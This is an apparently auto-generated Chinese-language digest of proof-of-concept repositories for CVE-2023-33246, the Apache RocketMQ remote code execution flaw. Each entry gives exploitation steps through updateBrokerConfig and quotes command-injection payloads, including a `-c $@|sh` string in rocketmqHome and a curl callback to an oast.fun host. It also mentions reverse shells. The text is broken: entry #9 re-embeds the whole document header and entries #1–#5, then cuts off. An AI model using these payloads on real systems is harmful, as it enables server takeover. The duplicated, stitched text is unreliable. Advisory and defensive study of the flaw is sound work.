# CVE-2023-33246

> 📦 该CVE有 **13** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-33246-0xKayala_CVE-2023-33246.md](../2023/CVE-2023-33246-0xKayala_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker, 和 Controller 组件暴露在公网，且缺少权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。根据漏洞信息，如果 RocketMQ 的某些组件（如 NameServer、Broker 和 Controller）暴露在公网上，并且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，从而完全控制服务器。

**有效性：**

根据CISA KEV收录信息, 此漏洞在野外被积极利用，证明其有效性。
提供的漏洞利用代码 `check.py` 是一个版本检测脚本，它通过连接目标端口并发送特定请求来判断 RocketMQ 的版本。虽然这个脚本本身并不能直接执行远程命令，但它可以用来确认目标是否为易受攻击的版本。

**投毒风险：**

查看 `check.py` 代码，主要是进行版本检测，虽然代码量比较大，但是没有发现明显的恶意代码或后门。代码中包含了大量 RocketMQ 的版本字符串，用于进行版本比对。 线程池用于并发扫描IP，网络请求部分使用了标准库，没有发现可疑的操作。因此，投毒风险较低，估计在 10% 左右。

**利用方式：**

1.  **版本检测：** 使用 `check.py` 脚本或其他方法检测目标 RocketMQ 实例的版本是否在受影响范围内（<= 5.1.0）。
2.  **漏洞利用：** 如果目标版本易受攻击，攻击者可以利用以下两种方式执行远程命令：
    *   **更新配置功能：** 攻击者可以利用未授权的访问权限，通过更新 RocketMQ 的配置来插入恶意命令。
    *   **伪造 RocketMQ 协议内容：** 攻击者可以构造恶意的 RocketMQ 协议数据包，发送给目标服务器，从而触发远程命令执行。

**修复建议：**

*   升级到 RocketMQ 5.1.1 或更高版本（如果使用 RocketMQ 5.x）。
*   升级到 RocketMQ 4.9.6 或更高版本（如果使用 RocketMQ 4.x）。
*   对暴露在公网的 RocketMQ 组件进行严格的权限控制和访问验证。

**项目地址:** [0xKayala/CVE-2023-33246](https://github.com/0xKayala/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #2

**来源**: [CVE-2023-33246-4mazing_CVE-2023-33246-Copy.md](../2023/CVE-2023-33246-4mazing_CVE-2023-33246-Copy.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer、Broker或Controller组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。由于 RocketMQ 的多个组件（NameServer、Broker 和 Controller）可能暴露在公网上且缺乏适当的权限验证，攻击者可以通过以下两种方式利用此漏洞：

1.  **更新配置功能：** 攻击者可以利用更新配置功能，通过发送恶意配置来执行任意命令，命令以 RocketMQ 运行用户的身份执行。
2.  **伪造 RocketMQ 协议内容：** 攻击者可以构造恶意的 RocketMQ 协议内容，达到执行命令的目的。

提供的漏洞利用代码是一个环境搭建的说明文档，引用了其他利用代码仓库。代码本身没有包含直接的漏洞利用payload，但给出了搭建漏洞环境的方法，参考链接包含着漏洞利用代码，因此可以判断该漏洞的POC是有效的。

**投毒风险分析：**

此仓库主要提供了环境搭建和参考链接，本身不包含直接的攻击代码，但间接引导用户使用参考链接中的POC。 如果参考链接的POC被植入恶意代码(例如反弹shell到恶意IP)，则存在投毒风险。由于无法直接评估参考链接的安全性，这里给出一个相对保守的估计，投毒风险的可能性为 10%。 这个风险主要来自于用户下载和使用来自不可信来源的POC。

**漏洞利用方式总结：**

1.  **漏洞定位：** 确定目标系统运行着受影响版本的 Apache RocketMQ，并且相关组件暴露在公网上。
2.  **攻击向量选择：** 选择利用更新配置功能或伪造 RocketMQ 协议内容这两种方式之一。
3.  **构造 Payload：** 构造包含恶意命令的 Payload。例如，如果利用更新配置功能，则需要构造能够执行任意命令的配置信息。如果伪造 RocketMQ 协议，则需要构造符合 RocketMQ 协议格式的恶意数据。
4.  **发送 Payload：** 将构造好的 Payload 发送到目标系统的 RocketMQ 组件。
5.  **执行命令：** 目标系统执行 Payload 中的命令，攻击者从而获得对系统的控制。

搜索引擎结果表明该漏洞已被广泛关注，并存在被利用的风险。CISA 也将此漏洞添加到已知被利用漏洞目录中，表明该漏洞具有较高的实际危害。

**项目地址:** [4mazing/CVE-2023-33246-Copy](https://github.com/4mazing/CVE-2023-33246-Copy)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #3

**来源**: [CVE-2023-33246-AiK1d_CVE-2023-33246.md](../2023/CVE-2023-33246-AiK1d_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可执行任意命令

**影响版本:** <= 5.1.0

**利用条件:** 需要RocketMQ组件暴露在公网且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行 (RCE) 漏洞。该漏洞存在于5.1.0及更早版本中。由于 RocketMQ 的 NameServer、Broker 和 Controller 组件暴露在公网且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，权限与 RocketMQ 运行的用户相同。提供的POC代码是一个检测工具，用于扫描目标是否存在漏洞。根据代码内容判断，投毒风险较低,因为只是检测是否存在漏洞。搜索引擎结果显示此漏洞已被广泛利用，并被添加到CISA的已知被利用漏洞目录中。利用方式包括更新配置和伪造协议内容。

**项目地址:** [AiK1d/CVE-2023-33246](https://github.com/AiK1d/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #4

**来源**: [CVE-2023-33246-I5N0rth_CVE-2023-33246.md](../2023/CVE-2023-33246-I5N0rth_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer、Broker或Controller组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。攻击者可以通过更新RocketMQ的配置，注入恶意命令，从而以运行RocketMQ的用户身份执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，该漏洞的POC代码是有效的。漏洞库信息和搜索引擎结果表明该漏洞已经被广泛关注，并且存在公开的漏洞利用代码。POC代码通过修改`rocketmqHome`属性，注入包含反弹shell的命令。

**投毒风险：**
此仓库中存在作者隐藏的投毒代码的可能性较低，大概为10%。
*   `README.md` 仅包含漏洞说明和截图，没有可疑代码。
*   `pom.xml` 定义了项目依赖，只依赖了`rocketmq-client`，没有引入其他恶意的依赖项。
*   `src/main/java/org/example/Main.java` 是漏洞利用的主要代码，虽然代码本身利用漏洞进行远程代码执行，但没有发现其他额外的恶意行为。
urls数组包含的地址可能存在恶意，但是这些地址可以自行修改，不是仓库本身自带的恶意代码。

**利用方式：**
1.  **目标确认:** 确定目标RocketMQ服务的NameServer地址。
2.  **构造恶意配置：** 利用DefaultMQAdminExt工具，构造包含恶意命令的Properties对象。关键在于修改`rocketmqHome`参数，将其设置为包含命令注入的字符串。POC中使用了`-c $@|sh . echo ping chr17sz2vtc0000ymdaggehyuhhyyyyyb.oast.fun;`作为示例，攻击者可以替换为任何希望执行的命令。
3.  **更新Broker配置：** 使用`admin.updateBrokerConfig()`方法将恶意配置发送到目标Broker。由于漏洞存在于未授权访问，攻击者可以绕过身份验证直接发送配置。
4.  **命令执行：** Broker在处理更新后的配置时，会执行`rocketmqHome`参数中的恶意命令，实现远程代码执行。

**缓解措施：**
*   升级到RocketMQ 5.1.1或更高版本(5.x分支)，或4.9.6或更高版本(4.x分支)。
*   对RocketMQ组件（NameServer、Broker、Controller）进行严格的权限控制，避免暴露在公网上。

**项目地址:** [I5N0rth/CVE-2023-33246](https://github.com/I5N0rth/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #5

**来源**: [CVE-2023-33246-Le1a_CVE-2023-33246.md](../2023/CVE-2023-33246-Le1a_CVE-2023-33246.md)

## CVE-2023-33246 - Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 5.1.0

**利用条件:** 需要目标RocketMQ服务暴露在网络上，且无权限验证或存在可绕过的权限验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。根据漏洞库信息和搜索结果，攻击者可以通过以下方式利用该漏洞：

1.  **利用方式:**  通过更新配置功能执行任意命令。RocketMQ的NameServer、Broker和Controller组件如果暴露在公网上且缺乏权限验证，攻击者可以通过更新配置的方式，执行任意系统命令，从而控制服务器。或者通过伪造RocketMQ协议内容也可以达到同样的效果。
2.  **POC有效性:**  提供的POC代码（java -jar CVE-2023-33246.jar -ip \"127.0.0.1:10911\" -cmd \"open -a Calculator\"）尝试利用此漏洞。该POC声称会在35秒延时后执行命令，并自动还原配置，以减少对目标环境的影响。基于漏洞描述，此POC代码应该有效。
3. **投毒风险评估:**

分析漏洞利用代码中的 README.md 文件，可以看到以下几点：

*   **自动化还原配置:** 工具声称在利用漏洞后会自动还原配置，以避免持久性影响。但此操作依赖程序正确运行完成，若中途强制关闭可能无法还原。
*   **延时执行:** 为了确保漏洞被触发，工具设置了35秒的延时，这个延时可以解释为等待心跳机制触发漏洞利用。

**风险评估:**

*   **较高风险:**  该工具可以执行任意命令，因此如果被恶意修改，可以植入后门、窃取数据或进行其他恶意活动。
*   **低度混淆:**  目前的代码没有明显的混淆或隐藏恶意功能的行为。

综上所述，虽然POC代码本身似乎是为了方便利用漏洞而编写，但仍存在一定的投毒风险。恶意攻击者可以修改该POC，在执行命令前后添加恶意代码，例如植入后门或窃取敏感信息。此外，如果工具在执行过程中被中断，自动还原配置的功能可能失效，导致目标系统配置被恶意更改。因此, 判定存在10%的投毒风险。

**项目地址:** [Le1a/CVE-2023-33246](https://github.com/Le1a/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #6

**来源**: [CVE-2023-33246-Malayke_CVE-2023-33246_RocketMQ_RCE_EXPLOIT.md](../2023/CVE-2023-33246-Malayke_CVE-2023-33246_RocketMQ_RCE_EXPLOIT.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ NameServer、Broker 或 Controller 组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。根据漏洞信息和搜索结果，该漏洞是由于 RocketMQ 的某些组件（NameServer、Broker、Controller）暴露在公网且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，获得服务器的控制权限。

**有效性:**
提供的 POC 代码 `CVE-2023-33246_RocketMQ_RCE_EXPLOIT.py` 通过 socket 连接到目标 RocketMQ 服务，构造包含恶意命令的 payload 并发送，从而实现远程代码执行。根据搜索结果，该漏洞已经被积极利用，POC 代码的有效性较高。

**投毒风险:**
查看提供的 POC 代码，该脚本主要功能是构造并发送恶意 payload，执行指定的命令。经过分析，未发现明显的投毒代码，例如下载执行恶意文件或篡改系统配置等操作。因此，认为该仓库中存在作者隐藏的投毒代码的概率较低，约为 0%。

**利用方式:**
1.  **目标确定:** 确定目标 RocketMQ 服务的 IP 地址和端口（默认端口可能为 9876）。
2.  **Payload 构造:** 使用 POC 脚本，指定要执行的命令。POC 脚本会将命令嵌入到特定的 RocketMQ 协议格式中，构造恶意的 payload。
3.  **发送 Payload:** POC 脚本通过 socket 连接到目标 RocketMQ 服务，并将构造的 payload 发送过去。
4.  **命令执行:** 如果目标 RocketMQ 服务存在漏洞且未进行修复，它将解析并执行 payload 中的命令，从而实现远程代码执行。

**项目地址:** [Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT](https://github.com/Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #7

**来源**: [CVE-2023-33246-MkJos_CVE-2023-33246_RocketMQ_RCE_EXP.md](../2023/CVE-2023-33246-MkJos_CVE-2023-33246_RocketMQ_RCE_EXP.md)

## CVE-2023-33246 Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ Broker组件暴露在公网且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 存在于 Apache RocketMQ 5.1.0 及更早版本中。由于 RocketMQ 的 NameServer、Broker 和 Controller 等组件暴露在公网上，且缺乏权限验证，攻击者可以利用 update configuration 功能，或通过伪造 RocketMQ 协议内容，以 RocketMQ 运行的系统用户身份执行任意命令。

**有效性：**

根据漏洞信息和搜索结果，该漏洞是一个已知的、被积极利用的远程代码执行漏洞。CISA 已将其添加到已知被利用的漏洞目录中。存在公开可用的PoC利用代码。

**投毒风险：**

PoC代码主要包含版本检测脚本（`RocketMQRceCheck`）和漏洞利用脚本（`RocketMQ_RCE_EXPLOIT`）。

*   版本检测脚本：用于检查目标 RocketMQ 服务的版本，判断是否存在漏洞。
*   漏洞利用脚本：通过发送恶意配置更新请求，或伪造 RocketMQ 协议，来执行任意命令。

README.md 文件中给出的利用方式是直接执行命令，例如 `curl chw9ft72vtc00002z5k0ge6rz7eyyyyyb.oast.fun/test`。这种利用方式本身不包含明显的投毒代码，但攻击者可以通过替换命令为恶意payload来达到投毒目的，例如下载并执行恶意脚本。另外检测脚本理论上也可以携带恶意payload，但可能性较低，因为check的目的是检查，携带恶意代码容易被发现。

考虑到代码仓库的作者可能会在利用脚本中嵌入后门，或使用隐蔽的方式执行恶意操作，因此存在一定的投毒风险，风险程度大约为10%。

**利用方式：**

1.  **组件暴露：**  攻击者首先需要确定目标 RocketMQ 的相关组件（如 Broker）暴露在公网上。
2.  **版本检测：**  攻击者可以使用 `RocketMQRceCheck` 脚本或其他方法来检测目标 RocketMQ 服务的版本，确认是否存在漏洞。
3.  **RCE利用：**
    *   **更新配置：** 攻击者可以利用 update configuration 功能，发送包含恶意命令的配置更新请求。  该命令将会被目标服务器执行。
    *   **协议伪造：** 攻击者还可以伪造 RocketMQ 协议内容，发送恶意请求到目标服务器，从而执行任意命令。通常命令执行的结果会通过外连的方式传回，例如利用curl命令将结果发送到攻击者控制的服务器上。
4.  **命令执行：**  成功利用漏洞后，攻击者可以以 RocketMQ 运行的系统用户身份执行任意命令，例如安装恶意软件、窃取敏感数据等。

**项目地址:** [MkJos/CVE-2023-33246_RocketMQ_RCE_EXP](https://github.com/MkJos/CVE-2023-33246_RocketMQ_RCE_EXP)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #8

**来源**: [CVE-2023-33246-PavilionQ_CVE-2023-33246-mitigation.md](../2023/CVE-2023-33246-PavilionQ_CVE-2023-33246-mitigation.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ组件（NameServer, Broker, Controller）暴露在公网且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是一个Apache RocketMQ中的远程代码执行漏洞。漏洞存在于5.1.0及更早版本中。由于RocketMQ的某些组件在公网暴露且缺乏权限验证，攻击者可以通过以下两种方式利用此漏洞：

1.  **利用更新配置功能：** 攻击者可以利用`updateBrokerConfig`方法，通过修改配置参数（例如`rocketmqHome`）来执行任意命令。POC代码中的`Main.java`文件演示了如何通过设置`rocketmqHome`属性来执行shell命令或反弹shell。

2.  **伪造RocketMQ协议内容：** 攻击者可以构造恶意的RocketMQ协议内容，绕过身份验证，从而执行命令。


**漏洞利用方式：**

1.  攻击者首先需要确定目标RocketMQ服务的NameServer地址。
2.  然后，攻击者可以使用POC代码中的`updateConfig`方法，修改Broker的配置，例如`rocketmqHome`，将其设置为包含恶意命令的字符串。
3.  RocketMQ服务在读取并应用新的配置时，会执行攻击者注入的命令。


**投毒风险分析：**

该POC代码的主要目的是演示漏洞的利用和缓解方法。`README.md`文件表明该项目旨在提供CVE-2023-33246的缓解措施，并且`BrokerConfig.java`文件包含了对`RocketmqHome`参数的增强验证。

`Main.java`包含用于攻击测试的代码，虽然用于演示漏洞利用，但不应被认为是投毒代码。

但是，仍然存在一些风险：

*   **潜在的供应链风险：** 依赖项`rocketmq-client`和`rocketmq-tools`可能存在未知的漏洞，虽然概率较低，但存在一定风险。
*   **代码缺陷：** 代码中可能存在未知的bug，可能被攻击者利用。
*   **误用：** 用户可能错误地将此代码部署到生产环境，导致安全风险。

因此，评估投毒风险为10%。大多数代码用于漏洞验证和防御，但依赖项和其他潜在问题始终存在一定风险。


**项目地址:** [PavilionQ/CVE-2023-33246-mitigation](https://github.com/PavilionQ/CVE-2023-33246-mitigation)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #9

**来源**: [CVE-2023-33246-Sumitpathania03_Apache-RocketMQ-CVE-2023-33246-.md](../2023/CVE-2023-33246-Sumitpathania03_Apache-RocketMQ-CVE-2023-33246-.md)

# CVE-2023-33246

> 📦 该CVE有 **13** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-33246-0xKayala_CVE-2023-33246.md](../2023/CVE-2023-33246-0xKayala_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker, 和 Controller 组件暴露在公网，且缺少权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。根据漏洞信息，如果 RocketMQ 的某些组件（如 NameServer、Broker 和 Controller）暴露在公网上，并且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，从而完全控制服务器。

**有效性：**

根据CISA KEV收录信息, 此漏洞在野外被积极利用，证明其有效性。
提供的漏洞利用代码 `check.py` 是一个版本检测脚本，它通过连接目标端口并发送特定请求来判断 RocketMQ 的版本。虽然这个脚本本身并不能直接执行远程命令，但它可以用来确认目标是否为易受攻击的版本。

**投毒风险：**

查看 `check.py` 代码，主要是进行版本检测，虽然代码量比较大，但是没有发现明显的恶意代码或后门。代码中包含了大量 RocketMQ 的版本字符串，用于进行版本比对。 线程池用于并发扫描IP，网络请求部分使用了标准库，没有发现可疑的操作。因此，投毒风险较低，估计在 10% 左右。

**利用方式：**

1.  **版本检测：** 使用 `check.py` 脚本或其他方法检测目标 RocketMQ 实例的版本是否在受影响范围内（<= 5.1.0）。
2.  **漏洞利用：** 如果目标版本易受攻击，攻击者可以利用以下两种方式执行远程命令：
    *   **更新配置功能：** 攻击者可以利用未授权的访问权限，通过更新 RocketMQ 的配置来插入恶意命令。
    *   **伪造 RocketMQ 协议内容：** 攻击者可以构造恶意的 RocketMQ 协议数据包，发送给目标服务器，从而触发远程命令执行。

**修复建议：**

*   升级到 RocketMQ 5.1.1 或更高版本（如果使用 RocketMQ 5.x）。
*   升级到 RocketMQ 4.9.6 或更高版本（如果使用 RocketMQ 4.x）。
*   对暴露在公网的 RocketMQ 组件进行严格的权限控制和访问验证。

**项目地址:** [0xKayala/CVE-2023-33246](https://github.com/0xKayala/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #2

**来源**: [CVE-2023-33246-4mazing_CVE-2023-33246-Copy.md](../2023/CVE-2023-33246-4mazing_CVE-2023-33246-Copy.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer、Broker或Controller组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。由于 RocketMQ 的多个组件（NameServer、Broker 和 Controller）可能暴露在公网上且缺乏适当的权限验证，攻击者可以通过以下两种方式利用此漏洞：

1.  **更新配置功能：** 攻击者可以利用更新配置功能，通过发送恶意配置来执行任意命令，命令以 RocketMQ 运行用户的身份执行。
2.  **伪造 RocketMQ 协议内容：** 攻击者可以构造恶意的 RocketMQ 协议内容，达到执行命令的目的。

提供的漏洞利用代码是一个环境搭建的说明文档，引用了其他利用代码仓库。代码本身没有包含直接的漏洞利用payload，但给出了搭建漏洞环境的方法，参考链接包含着漏洞利用代码，因此可以判断该漏洞的POC是有效的。

**投毒风险分析：**

此仓库主要提供了环境搭建和参考链接，本身不包含直接的攻击代码，但间接引导用户使用参考链接中的POC。 如果参考链接的POC被植入恶意代码(例如反弹shell到恶意IP)，则存在投毒风险。由于无法直接评估参考链接的安全性，这里给出一个相对保守的估计，投毒风险的可能性为 10%。 这个风险主要来自于用户下载和使用来自不可信来源的POC。

**漏洞利用方式总结：**

1.  **漏洞定位：** 确定目标系统运行着受影响版本的 Apache RocketMQ，并且相关组件暴露在公网上。
2.  **攻击向量选择：** 选择利用更新配置功能或伪造 RocketMQ 协议内容这两种方式之一。
3.  **构造 Payload：** 构造包含恶意命令的 Payload。例如，如果利用更新配置功能，则需要构造能够执行任意命令的配置信息。如果伪造 RocketMQ 协议，则需要构造符合 RocketMQ 协议格式的恶意数据。
4.  **发送 Payload：** 将构造好的 Payload 发送到目标系统的 RocketMQ 组件。
5.  **执行命令：** 目标系统执行 Payload 中的命令，攻击者从而获得对系统的控制。

搜索引擎结果表明该漏洞已被广泛关注，并存在被利用的风险。CISA 也将此漏洞添加到已知被利用漏洞目录中，表明该漏洞具有较高的实际危害。

**项目地址:** [4mazing/CVE-2023-33246-Copy](https://github.com/4mazing/CVE-2023-33246-Copy)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #3

**来源**: [CVE-2023-33246-AiK1d_CVE-2023-33246.md](../2023/CVE-2023-33246-AiK1d_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可执行任意命令

**影响版本:** <= 5.1.0

**利用条件:** 需要RocketMQ组件暴露在公网且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行 (RCE) 漏洞。该漏洞存在于5.1.0及更早版本中。由于 RocketMQ 的 NameServer、Broker 和 Controller 组件暴露在公网且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，权限与 RocketMQ 运行的用户相同。提供的POC代码是一个检测工具，用于扫描目标是否存在漏洞。根据代码内容判断，投毒风险较低,因为只是检测是否存在漏洞。搜索引擎结果显示此漏洞已被广泛利用，并被添加到CISA的已知被利用漏洞目录中。利用方式包括更新配置和伪造协议内容。

**项目地址:** [AiK1d/CVE-2023-33246](https://github.com/AiK1d/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #4

**来源**: [CVE-2023-33246-I5N0rth_CVE-2023-33246.md](../2023/CVE-2023-33246-I5N0rth_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer、Broker或Controller组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。攻击者可以通过更新RocketMQ的配置，注入恶意命令，从而以运行RocketMQ的用户身份执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，该漏洞的POC代码是有效的。漏洞库信息和搜索引擎结果表明该漏洞已经被广泛关注，并且存在公开的漏洞利用代码。POC代码通过修改`rocketmqHome`属性，注入包含反弹shell的命令。

**投毒风险：**
此仓库中存在作者隐藏的投毒代码的可能性较低，大概为10%。
*   `README.md` 仅包含漏洞说明和截图，没有可疑代码。
*   `pom.xml` 定义了项目依赖，只依赖了`rocketmq-client`，没有引入其他恶意的依赖项。
*   `src/main/java/org/example/Main.java` 是漏洞利用的主要代码，虽然代码本身利用漏洞进行远程代码执行，但没有发现其他额外的恶意行为。
urls数组包含的地址可能存在恶意，但是这些地址可以自行修改，不是仓库本身自带的恶意代码。

**利用方式：**
1.  **目标确认:** 确定目标RocketMQ服务的NameServer地址。
2.  **构造恶意配置：** 利用DefaultMQAdminExt工具，构造包含恶意命令的Properties对象。关键在于修改`rocketmqHome`参数，将其设置为包含命令注入的字符串。POC中使用了`-c $@|sh . echo ping chr17sz2vtc0000ymdaggehyuhhyyyyyb.oast.fun;`作为示例，攻击者可以替换为任何希望执行的命令。
3.  **更新Broker配置：** 使用`admin.updateBrokerConfig()`方法将恶意配置发送到目标Broker。由于漏洞存在于未授权访问，攻击者可以绕过身份验证直接发送配置。
4.  **命令执行：** Broker在处理更新后的配置时，会执行`rocketmqHome`参数中的恶意命令，实现远程代码执行。

**缓解措施：**
*   升级到RocketMQ 5.1.1或更高版本(5.x分支)，或4.9.6或更高版本(4.x分支)。
*   对RocketMQ组件（NameServer、Broker、Controller）进行严格的权限控制，避免暴露在公网上。

**项目地址:** [I5N0rth/CVE-2023-33246](https://github.com/I5N0rth/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #5

**来源**: [CVE-2023-33246-Le1a_CVE-2023-33246.md](../2023/CVE-2023-33246-Le1a_CVE-2023-33246.md)

## CVE-2023-33246 - Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 5.1.0

**利用条件:** 需要目标RocketMQ服务暴露在网络上，且无权限验证或存在可绕过的权限验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。根据漏洞库信息和搜索结果，攻击者可以通过以下方式利用该漏洞：

1.  **利用方式:**  通过更新配置功能执行任意命令。RocketMQ的NameServer、Broker和Controller组件如果暴露在公网上且缺乏权限验证，攻击者可以通过更新配置的方式，执行任意系统命令，从而控制服务器。或者通过伪造RocketMQ协议内容也可以达到同样的效果。
2.  **POC有效性:**  提供的POC代码（java -jar CVE-2023-33246.jar -ip \"127.0.0.1:10911\" -cmd \"open -a Calculator\"）尝试利用此漏洞。该POC声称会在35秒延时后执行命令，并自动还原配置，以减少对目标环境的影响。基于漏洞描述，此POC代码应该有效。
3. **投毒风险评估:**

分析漏洞利用代码中的 README.md 文件，可以看到以下几点：

*   **自动化还原配置:** 工具声称在利用漏洞后会自动还原配置，以避免持久性影响。但此操作依赖程序正确运行完成，若中途强制关闭可能无法还原。
*   **延时执行:** 为了确保漏洞被触发，工具设置了35秒的延时，这个延时可以解释为等待心跳机制触发漏洞利用。

**风险评估:**

*   **较高风险:**  该工具可以执行任意命令，因此如果被恶意修改，可以植入后门、窃取数据或进行其他恶意活动。
*   **低度混淆:**  目前的代码没有明显的混淆或隐藏恶意功能的行为。

综上所述，虽然POC代码本身似乎是为了方便利用漏洞而编写，但仍存在一定的投毒风险。恶意攻击者可以修改该POC，在执行命令前后添加恶意代码，例如植入后门或窃取敏感信息。此外，如果工具在执行过程中被中断，自动还原配置的功能可能失效，导致目标系统配置被恶意更改。因此, 判定存在10%的投毒风险。

**项目地址:** [Le1a/CVE-2023-33246](https://github.com/Le1a/CVE-2023-33246)

